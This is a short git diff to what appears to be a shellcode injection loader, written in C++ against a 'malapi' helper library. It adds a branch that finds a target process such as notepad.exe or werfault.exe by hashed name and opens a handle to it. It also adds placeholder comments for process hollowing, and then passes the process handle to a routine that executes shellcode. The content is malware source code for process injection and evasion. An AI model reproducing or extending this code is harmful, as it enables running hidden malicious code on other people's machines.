@@ -44,7 +44,7 @@ VOID entry(void)
 #if CONFIG_CREATE_PROCESS == 1
 	LPCSTR file_path = "C:\\Windows\\System32\\notepad.exe";
 	process_handle = malapi::CreateSuspendedProcess((LPSTR)file_path);
-#else
+#elif CONFIG_CREATE_PROCESS == 2
 	constexpr ULONG targets[] = {
 		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"),
 		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
@@ -60,6 +60,9 @@ VOID entry(void)
 	}
 	LOG_SUCCESS("Process ID: %d", pid);
 	process_handle = malapi::GetProcessHandle(pid);
+#else
+	// ProcessHollowing
+	// AddressOfEntryPoint
 #endif
 
 	if (!ExecuteShellcode(process_handle, shellcode, sizeof(shellcode)))
